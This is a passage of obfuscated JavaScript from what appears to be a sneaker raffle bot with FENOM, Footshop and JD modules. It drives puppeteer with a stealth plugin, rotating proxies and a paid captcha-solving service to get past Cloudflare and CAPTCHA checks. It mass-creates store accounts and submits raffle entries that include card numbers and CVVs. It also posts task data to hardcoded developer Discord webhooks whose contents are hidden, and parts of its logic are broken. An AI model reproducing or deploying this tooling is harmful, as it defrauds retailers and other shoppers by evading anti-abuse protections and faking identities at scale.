                                await _0x131677['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x4ce39e = 'no', console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x148663['name'] + ']\x20Task\x20' + (_0x33086f + 0x1) + '\x20:\x20Account\x20' + _0x28e904[_0x33086f]['Email'] + '\x20Generated')), _0x80a504['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x28e904[_0x33086f]['Email'] + ',' + _0x28e904[_0x33086f]['Password']);
                                try {
                                    _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0xc7959f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4236dd(_0xe1dcb8, _0xc7959f['succesDEVMSG']);
                            } catch (_0x2a7347) {
                                throw new Error('Account\x20generation\x20failed:\x20' + _0x2a7347);
                            }
                        } catch (_0x5c8285) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x148663['name'] + ']\x20Task\x20' + (_0x33086f + 0x1) + '\x20:\x20' + _0x5c8285)), _0x5ee2e4 = '' + _0x5c8285;
                            var _0x373c9b = await _0x23dc1b(_0x28e904[_0x33086f], _0x148663, 'acc', !![], _0x5ee2e4);
                            _0xc7959f['errorDEV'] = { 'embeds': [_0x373c9b] }, _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0xc7959f['errorDEV']), await _0x4236dd(_0x48c50b, _0xc7959f['errorDEV']), _0x4ce39e = 'yes';
                        } finally {
                            _0x1ccf6b['close']();
                            if (_0x4ce39e == 'yes' && _0x367163 != 0x5 && _0x5ee2e4 != 'Size\x20Not\x20Found') {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x148663['name'] + ']\x20Task\x20' + (_0x33086f + 0x1) + '\x20:\x20Retrying')), _0x33086f = _0x33086f - 0x1, _0x367163 = _0x367163 + 0x1;
                                continue;
                            }
                            _0x4ce39e == 'yes' && _0x367163 >= 0x5 && (_0xc8d9fd(_0x28e904[_0x33086f], _0x148663), _0x4ce39e = 'no', _0x367163 = 0x0), console['log'](_0x38a61b() + '\x20[' + _0x148663['name'] + ']\x20Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x3627ed(_0x2d5167, _0xaed215, _0x5bf985) {
                    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x9a51aa['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1dfc21 = 0x0; _0x1dfc21 < _0xaed215['length']; _0x1dfc21++) {
                        if (_0x2c3d9f != 'yes')
                            var _0x2c3d9f = '', _0x1c65d6 = 0x0;
                        var _0x5ee574;
                        await _0x2f5330(_0xaed215, _0x1dfc21), _0x1f02d2(_0x2d5167['name'] + '\x20Task\x20' + (_0x1dfc21 + 0x1) + '\x20/\x20' + _0xaed215['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa);
                        const _0xc84411 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x119f50 = Math['round'](Math['random']() * (_0x5bf985['length'] - 0x1)), _0x42368f = _0x5bf985[_0x119f50]['split'](':'), _0x3ac742;
                        try {
                            _0x3ac742 = await _0x6d7b51['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x42368f[0x0] + ':' + _0x42368f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3ac742 = await _0x6d7b51['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x42368f[0x0] + ':' + _0x42368f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x7c8bc = await _0x3ac742['newPage'](), _0x2c03a4 = await _0x7c8bc['target']()['createCDPSession'](), { windowId: _0x5a1396 } = await _0x2c03a4['send']('Browser.getWindowForTarget');
                            await _0x7c8bc['authenticate']({
                                'username': '' + _0x42368f[0x2],
                                'password': '' + _0x42368f[0x3]
                            }), console['log'](_0x38a61b() + '\x20[' + _0x2d5167['name'] + ']\x20Task\x20' + (_0x1dfc21 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x7c8bc['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x38a61b() + '\x20[' + _0x2d5167['name'] + ']\x20Task\x20' + (_0x1dfc21 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xbbd9dc(0xbb8), await _0x2c03a4['send']('Browser.setWindowBounds', {
                                'windowId': _0x5a1396,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xbbd9dc(0x1f40);
                            try {
                                await _0x7c8bc['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0xbbd9dc(0x1388), console['log'](_0x38a61b() + '\x20[' + _0x2d5167['name'] + ']\x20Task\x20' + (_0x1dfc21 + 0x1) + '\x20:\x20Logging\x20in'), await _0x7c8bc['type']('input[name=\x22email\x22]', '' + _0xaed215[_0x1dfc21]['Email']), await _0xbbd9dc(0x1f4), await _0x7c8bc['type']('input[name=\x22password\x22]', '' + _0xaed215[_0x1dfc21]['Password']), await _0xbbd9dc(0x258), await _0x7c8bc['$eval']('#login-form', _0x225e92 => _0x225e92['submit']()), await _0x7c8bc['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0xbbd9dc(0x1f4), await _0x7c8bc['goto']('' + _0xaed215[_0x1dfc21]['Url']), await _0x7c8bc['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x38a61b() + '\x20[' + _0x2d5167['name'] + ']\x20Task\x20' + (_0x1dfc21 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0xaed215[_0x1dfc21]['Size']);
                            if (_0xaed215[_0x1dfc21]['Size'] != 'RANDOM') {
                                var _0x5a16dc = '\x20' + _0xaed215[_0x1dfc21]['Size'] + '\x20';
                                const _0x54421b = await _0x7c8bc['$x']('//span[contains(text(),\x20' + _0x5a16dc + ')]');
                                await _0x54421b[0x0]['click']();
                            } else {
                                const _0x3c5561 = await _0x7c8bc['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0xba52a9 = Math['round'](Math['random']() * (_0x3c5561['length'] - 0x1));
                                await _0x3c5561[_0xba52a9]['click']();
                            }
                            await _0xbbd9dc(0x258), await _0x7c8bc['click']('#cookieChoiceDismiss'), await _0xbbd9dc(0x3e8), await _0x7c8bc['type']('#instagram-account', '' + _0xaed215[_0x1dfc21]['Follower']), await _0xbbd9dc(0x28a), await _0x7c8bc['click']('#book-btn'), await _0xbbd9dc(0xbb8), await _0x7c8bc['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0xbbd9dc(0x1f4), console['log'](_0x38a61b() + '\x20[' + _0x2d5167['name'] + ']\x20Task\x20' + (_0x1dfc21 + 0x1) + '\x20:\x20' + _0x19e6c5['cyan']('Solving\x20Captcha')), await _0x7c8bc['solveRecaptchas'](), console['log'](_0x38a61b() + '\x20[' + _0x2d5167['name'] + ']\x20Task\x20' + (_0x1dfc21 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xbbd9dc(0x7d0), await _0x7c8bc['$eval']('#book-btn-for-sure', _0x28e1f5 => _0x28e1f5['click']()), await _0xbbd9dc(0x12c), await _0x7c8bc['click']('#book-btn-for-sure'), await _0xbbd9dc(0xdac);
                            const _0x2e83a4 = await _0x7c8bc['$eval']('.reservation-popup\x20>\x20.title', _0x2694a4 => {
                                return _0x2694a4['innerHTML'];
                            });
                            if (_0x2e83a4) {
                                _0x2c3d9f = 'no', _0x5d1d0f(_0xaed215[_0x1dfc21], _0x2d5167), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x2d5167['name'] + ']\x20Task\x20' + (_0x1dfc21 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x404521 = await _0x23dc1b(_0xaed215[_0x1dfc21], _0x2d5167, 'dev', ![]), _0x4acfa0 = await _0x23dc1b(_0xaed215[_0x1dfc21], _0x2d5167, 'pub', ![]);
                                const _0x1e28a2 = {
                                    'succesDEVMSG': { 'embeds': [_0x404521] },
                                    'succesPUBMSG': { 'embeds': [_0x4acfa0] }
                                };
                                try {
                                    _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x1e28a2['succesDEVMSG']), await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x1e28a2['succesDEVMSG']), await _0xbbd9dc(0xc8), await _0x4236dd(_0x4d6262, _0x1e28a2['succesPUBMSG']);
                                } catch (_0x352b6c) {
                                    console['log'](_0x19e6c5['yellow'](_0x38a61b() + '\x20[' + _0x2d5167['name'] + ']\x20Task\x20' + (_0x1dfc21 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x352b6c));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x3b7a7a) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x2d5167['name'] + ']\x20Task\x20' + (_0x1dfc21 + 0x1) + '\x20:\x20' + _0x3b7a7a)), _0x5ee574 = '' + _0x3b7a7a;
                            var _0x5dd3e5 = await _0x23dc1b(_0xaed215[_0x1dfc21], _0x2d5167, 'dev', !![], _0x5ee574), _0x404521 = await _0x23dc1b(_0xaed215[_0x1dfc21], _0x2d5167, 'dev', ![]), _0x4acfa0 = await _0x23dc1b(_0xaed215[_0x1dfc21], _0x2d5167, 'pub', ![]);
                            const _0x5ae711 = {
                                'succesDEVMSG': { 'embeds': [_0x404521] },
                                'succesPUBMSG': { 'embeds': [_0x4acfa0] }
                            };
                            _0x5ae711['errorDEV'] = { 'embeds': [_0x5dd3e5] }, _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x5ae711['errorDEV']), await _0x4236dd(_0x48c50b, _0x5ae711['errorDEV']), _0x3b7a7a != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x2c3d9f = 'yes');
                        } finally {
                            _0x3ac742['close']();
                            if (_0x2c3d9f == 'yes' && _0x1c65d6 != 0x5 && _0x5ee574 != 'Size\x20Not\x20Found') {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x2d5167['name'] + ']\x20Task\x20' + (_0x1dfc21 + 0x1) + '\x20:\x20Retrying')), _0x1dfc21 = _0x1dfc21 - 0x1, _0x1c65d6 = _0x1c65d6 + 0x1;
                                continue;
                            }
                            _0x2c3d9f == 'yes' && _0x1c65d6 >= 0x5 && (_0xc8d9fd(_0xaed215[_0x1dfc21], _0x2d5167), _0x2c3d9f = 'no', _0x1c65d6 = 0x0), console['log'](_0x38a61b() + '\x20[' + _0x2d5167['name'] + ']\x20Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x42c1dd, _0x448278, _0x2d7e7c) {
                _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x9a51aa['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x1986d9 = 0x0; _0x1986d9 < _0x448278['length']; _0x1986d9++) {
                    var _0x3ff52b;
                    if (_0x352524 != 'yes')
                        var _0x352524 = '', _0x39bc22 = 0x0;
                    var _0x3fd395 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x213f4d
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x448278[_0x1986d9]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x448278[_0x1986d9]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x9a51aa['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x198625
                            }
                        ]
                    }], _0x3baaf9 = await _0x23dc1b(_0x448278[_0x1986d9], _0x42c1dd, 'dev', ![]), _0x45fbdf = await _0x23dc1b(_0x448278[_0x1986d9], _0x42c1dd, 'pub', ![]);
                    const _0x323bff = {
                        'succesDEVMSG': { 'embeds': [_0x3baaf9] },
                        'succesPUBMSG': { 'embeds': [_0x45fbdf] }
                    }, _0x14635e = { 'embeds': _0x3fd395 };
                    await _0x2f5330(_0x448278, _0x1986d9);
                    if (_0x448278[_0x1986d9]['Email'] == '' || _0x448278[_0x1986d9]['FirstName'] == '' || _0x448278[_0x1986d9]['LastName'] == '' || _0x448278[_0x1986d9]['Country'] == '' || _0x448278[_0x1986d9]['Size'] == '' || _0x448278[_0x1986d9]['Address1'] == '' || _0x448278[_0x1986d9]['Zip'] == '') {
                        console['log'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x448278[_0x1986d9]['Email'] == '' || _0x448278[_0x1986d9]['FirstName'] == '' || _0x448278[_0x1986d9]['LastName'] == '' || _0x448278[_0x1986d9]['Country'] == '' || _0x448278[_0x1986d9]['Size'] == '' || _0x448278[_0x1986d9]['Address1'] == '' || _0x448278[_0x1986d9]['Zip'] == '' || _0x448278[_0x1986d9]['Phone'] == '') {
                        console['log'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x530a12 = '' + _0x448278[_0x1986d9]['Url'];
                    if (_0x9a51aa['useRandomProxy'] = ![])
                        var _0x499e9e = _0x2d7e7c[_0x1986d9]['split'](':');
                    else
                        var _0x139c5b = Math['round'](Math['random']() * (_0x2d7e7c['length'] - 0x1)), _0x499e9e = _0x2d7e7c[_0x139c5b]['split'](':');
                    const _0x3c4a75 = await _0x6d7b51['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0x499e9e[0x0] + ':' + _0x499e9e[0x1]]
                    });
                    try {
                        const _0x597997 = await _0x3c4a75['newPage']();
                        await _0x597997['authenticate']({
                            'username': '' + _0x499e9e[0x2],
                            'password': '' + _0x499e9e[0x3]
                        }), console['log'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x597997['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x597997['setRequestInterception'](!![]), _0x597997['on']('request', _0x35108b => {
                            _0x35108b['resourceType']() === 'image' || _0x35108b['resourceType']() === 'font' || _0x35108b['resourceType']() === 'media' ? _0x35108b['abort']() : _0x35108b['continue']();
                        }), await _0x597997['goto'](_0x530a12), await _0xbbd9dc(0xbb8), await _0x597997['waitForSelector']('.control__JhutY'), await _0x597997['click']('.control__JhutY'), await _0xbbd9dc(0x1f4);
                        if (_0x448278[_0x1986d9]['Size'] != 'RANDOM')
                            try {
                                const _0x59a526 = await _0x597997['$x']('//div[contains(text(),\x20\x27' + _0x448278[_0x1986d9]['Size'] + '\x27)]');
                                await _0x59a526[0x0]['click']();
                            } catch {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x13f729 = await _0x597997['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x3c2a86 = Math['round'](Math['random']() * (_0x13f729['length'] - 0x1));
                            await _0x13f729[_0x3c2a86]['click']();
                        }
                        await _0xbbd9dc(0x4b0);
                        const _0x4546b6 = await _0x597997['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x4546b6[0x0]['click'](), await _0x597997['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x597997['type']('input[name=\x22email\x22]', '' + _0x448278[_0x1986d9]['Email']), await _0xbbd9dc(0x640), await _0x597997['type']('input[name=\x22phone\x22]', '' + _0x448278[_0x1986d9]['Phone']), await _0xbbd9dc(0x4b0), await _0x597997['click']('button.btn.continue-button__1RtsS'), await _0xbbd9dc(0x4b0);
                        try {
                            await _0x597997['type']('input[name=\x22firstName\x22]', '' + _0x448278[_0x1986d9]['FirstName']), await _0xbbd9dc(0x258);
                        } catch {
                            const _0x180396 = await _0x597997['$$eval']('.invalid-feedback\x20>\x20div', _0x2646ba => {
                                return _0x2646ba['map'](_0x551f1f => _0x551f1f['innerText']);
                            });
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20' + _0x180396));
                            continue;
                        }
                        await _0x597997['type']('input[name=\x22lastName\x22]', '' + _0x448278[_0x1986d9]['LastName']), await _0xbbd9dc(0xc8), await _0x597997['type']('input[name=\x22instagramUsername\x22]', '' + _0x448278[_0x1986d9]['Follower']), await _0xbbd9dc(0x4b0), await _0x597997['click']('button.btn.continue-button__1RtsS'), await _0xbbd9dc(0x3e8), console['log'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x597997['select']('select[name=\x22country\x22]', '' + _0x448278[_0x1986d9]['Country']), await _0xbbd9dc(0x2bc), await _0x597997['type']('input[name=\x22streetName\x22]', '' + _0x448278[_0x1986d9]['Address1']), await _0xbbd9dc(0x258), await _0x597997['type']('input[name=\x22houseNumber\x22]', _0x448278[_0x1986d9]['HouseNumber'] + '\x20' + _0x448278[_0x1986d9]['Address2']), await _0xbbd9dc(0xc8), await _0x597997['type']('input[name=\x22postalCode\x22]', '' + _0x448278[_0x1986d9]['Zip']), await _0xbbd9dc(0x1f4), await _0x597997['type']('input[name=\x22city\x22]', '' + _0x448278[_0x1986d9]['City']), await _0xbbd9dc(0x4b0), await _0x597997['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0xbbd9dc(0x4b0), await _0x597997['click']('button.btn.continue-button__1RtsS'), await _0xbbd9dc(0x4b0), console['log'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x597997['solveRecaptchas'](), console['log'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0xbbd9dc(0xbb8), await _0x597997['click']('button.btn.continue-button__1RtsS'), await _0xbbd9dc(0x1388), console['log'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x597997['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x597997['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xbbd9dc(0x4b0), await _0x597997['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x448278[_0x1986d9]['CardNumber']), await _0xbbd9dc(0x320), await _0x597997['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x597997['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x448278[_0x1986d9]['ExpiryDate']), await _0xbbd9dc(0x4b0), await _0x597997['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x597997['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x448278[_0x1986d9]['CVV']), await _0xbbd9dc(0x226), await _0x597997['type']('input[name=\x22holderName\x22]', '' + _0x448278[_0x1986d9]['NameOnCard']), await _0xbbd9dc(0x226), await _0x597997['click']('button.adyen-checkout__button'), console['log'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x597997['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0xbbd9dc(0xbb8);
                        } catch (_0x4632db) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x203DS\x20Failed')), _0x3ff52b = '3DS\x20Error\x20' + _0x4632db;
                            var _0x55e33a = await _0x23dc1b(_0x448278[_0x1986d9], _0x42c1dd, 'dev', !![], _0x3ff52b);
                            _0x323bff['errorDEV'] = { 'embeds': [_0x55e33a] };
                            _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x323bff['errorDEV']);
                            await _0x4236dd(_0x48c50b, _0x323bff['errorDEV']);
                            continue;
                        }
                        _0x5d1d0f(_0x448278[_0x1986d9], _0x42c1dd), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '')
                            try {
                                await _0x4236dd(_0x9a51aa['webhook'], _0x323bff['succesDEVMSG']);
                            } catch {
                            }
                        await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x323bff['succesDEVMSG']), await _0xbbd9dc(0xc8);
                        try {
                            await _0x4236dd(_0x4d6262, _0x323bff['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0xde5a41) {
                        console['log'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20' + _0xde5a41), _0x3ff52b = '' + _0xde5a41;
                        var _0x55e33a = await _0x23dc1b(_0x448278[_0x1986d9], _0x42c1dd, 'dev', !![], _0x3ff52b);
                        _0x323bff['errorDEV'] = { 'embeds': [_0x55e33a] }, _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x323bff['errorDEV']), await _0x4236dd(_0x48c50b, _0x323bff['errorDEV']), _0x352524 = 'yes';
                    } finally {
                        _0x3c4a75['close']();
                        if (_0x352524 == 'yes' && _0x39bc22 != 0x5) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x42c1dd['name'] + ']\x20Task\x20' + (_0x1986d9 + 0x1) + '\x20:\x20Retrying')), _0x1986d9 = _0x1986d9 - 0x1, _0x39bc22 = _0x39bc22 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x9a51aa['footshopDelay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x5eeb76, _0x4dc38f, _0x212e98) {
                var _0x2ec054 = ![], _0x42586b = ![];
                if (_0x9a51aa['captchaKey'] == '' || _0x9a51aa['captchaKey'] == undefined)
                    return console['log'](_0x19e6c5['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x9a51aa['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x14879c = 0x0; _0x14879c < _0x4dc38f['length']; _0x14879c++) {
                    if (_0x2c9574 != 'yes')
                        var _0x2c9574 = '', _0x529635 = 0x0;
                    var _0xf0e795, _0x23a200 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x4dc38f[_0x14879c]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x4dc38f[_0x14879c]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x213f4d
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x9a51aa['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x198625
                            }
                        ]
                    }];
                    const _0x2d9daa = { 'embeds': _0x23a200 };
                    _0x1f02d2(_0x5eeb76['name'] + '\x20Task\x20' + (_0x14879c + 0x1) + '\x20/\x20' + _0x4dc38f['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa), await _0x2f5330(_0x4dc38f, _0x14879c);
                    var _0x5e147f = await _0x23dc1b(_0x4dc38f[_0x14879c], _0x5eeb76, 'dev', ![]), _0xcd0dd0 = await _0x23dc1b(_0x4dc38f[_0x14879c], _0x5eeb76, 'pub', ![]);
                    const _0x57c45c = {
                        'succesDEVMSG': { 'embeds': [_0x5e147f] },
                        'succesPUBMSG': { 'embeds': [_0xcd0dd0] }
                    };
                    if (_0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '')
                        try {
                            await _0x4236dd(_0x9a51aa['webhook'], _0x57c45c['succesDEVMSG']);
                        } catch {
                        }
                    await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x57c45c['succesDEVMSG']), await _0xbbd9dc(0xc8);
                    try {
                        await _0x4236dd(_0x4d6262, _0x57c45c['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x4dc38f[_0x14879c]['Email'] == '' || _0x4dc38f[_0x14879c]['Url'] == '' || _0x4dc38f[_0x14879c]['FirstName'] == '' || _0x4dc38f[_0x14879c]['LastName'] == '') {
                        console['log'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x14879c + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x9a51aa['useRandomProxy'] = ![])
                        var _0x1b5c97 = _0x212e98[_0x14879c]['split'](':');
                    else
                        var _0x19c2e5 = Math['round'](Math['random']() * (_0x212e98['length'] - 0x1)), _0x1b5c97 = _0x212e98[_0x19c2e5]['split'](':');
                    const _0xcc4dce = await _0x6d7b51['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0x1b5c97[0x0] + ':' + _0x1b5c97[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x50bbaf = await _0xcc4dce['newPage']();
                        await _0x50bbaf['authenticate']({
                            'username': '' + _0x1b5c97[0x2],
                            'password': '' + _0x1b5c97[0x3]
                        }), console['log'](_0x38a61b() + '\x20[' + _0x5eeb76['name'] + ']\x20Task\x20' + (_0x14879c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x50bbaf['setRequestInterception'](!![]), _0x50bbaf['on']('request', _0x8b9c78 => {
                            _0x8b9c78['resourceType']() === 'image' || _0x8b9c78['resourceType']() === 'font' || _0x8b9c78['resourceType']() === 'media' ? _0x8b9c78['abort']() : _0x8b9c78['continue']();
                        }), await _0x50bbaf['goto']('' + _0x4dc38f[_0x14879c]['Url'], {
                            'waitUntil': 'networkidle2',
                            'timeout': 0xea60
                        });
                        try {
                            await _0x50bbaf['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
